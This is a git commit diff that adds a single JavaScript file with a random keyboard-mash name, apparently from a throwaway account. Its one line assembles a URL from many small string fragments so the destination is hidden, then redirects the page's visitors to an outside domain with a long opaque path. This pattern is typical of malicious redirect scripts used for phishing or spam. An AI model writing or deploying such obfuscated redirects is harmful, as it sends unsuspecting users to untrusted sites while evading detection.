3c158cda359d3e791be12e883b8623161f631042
Parabeauty <113865732+Parabeauty@users.noreply.github.com>
2022-12-10 14:32:08 +0100

    Create sdthfyjdfhgbdtyjdfghdrth.js

---
+++ sdthfyjdfhgbdtyjdfghdrth.js
@@ -0,0 +1,1 @@
+window.location.replace(``.concat(`ht`,`tps:/`,`/ww`,`w.roa`,`dswor`,`ks.co`,`m/gQ_h`,`BEIKQR`,`fugBl`,`4Sr-C7`,`B4uJOrw`,`XJPigVd`,`3InLCfl`,`bY93Lu`,`aL-CFyH`,`66xgX`,`ncWcC_`,`DN5n8k`,`bVAj6mi`,`HPLE4X`,`w~~/TA`,`HA/KESbGp1Wic`,`HAMIDrr2`))
